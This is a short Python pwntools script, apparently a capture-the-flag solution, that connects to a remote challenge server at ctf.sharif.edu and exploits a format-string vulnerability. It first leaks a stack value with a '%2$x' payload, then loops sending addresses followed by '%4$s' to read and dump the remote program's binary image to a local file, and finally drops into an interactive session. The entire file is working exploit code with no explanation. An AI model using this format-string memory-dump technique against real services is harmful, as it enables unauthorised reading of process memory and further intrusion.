#!/usr/bin/python

# objdump -Mintel,i386 -b binary -m i386 --adjust-vma=0x08048410 -D binary

from pwn import *

r = remote("ctf.sharif.edu", 54518)
b = open("binary", "wb")
r.sendline("%2$x")
r.recvuntil("bytes\n")
leak = int(r.recvline().strip(), 16)
print hex(leak)
t = 0
for i in range(500):
    r.sendline(p32(0x08048410+t)+"%4$s")
    #r.sendline("%{}$p".format(i))
    #r.sendline("%{}$p".format(i))
    r.recvuntil("bytes\n")
    a = r.recv(1024)[4:].strip()
    b.write(a + "\x00")
    t += len(a) + 1
    print hexdump(a)
b.close()
r.interactive()

